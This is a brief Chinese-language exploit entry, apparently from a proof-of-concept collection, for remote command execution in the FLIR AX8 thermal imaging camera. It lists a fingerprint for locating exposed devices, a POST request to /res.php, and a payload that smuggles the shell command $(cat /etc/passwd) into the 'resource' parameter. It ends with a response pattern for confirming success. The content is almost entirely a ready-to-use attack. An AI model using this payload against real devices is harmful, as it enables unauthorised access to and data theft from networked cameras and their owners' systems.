# FLIR-AX8在线式红外热成像仪REC

FLIR ｜ 其他 ｜ —
- **指纹**：`app="FLIR-FLIR-AX8"`
- **请求**：`POST /res.php HTTP/1.1`

**Payload**
```
action=node&resource=$(cat /etc/passwd)
```
- **响应特征**：200 ^(?=.*?root)(?=.*?bin).*?$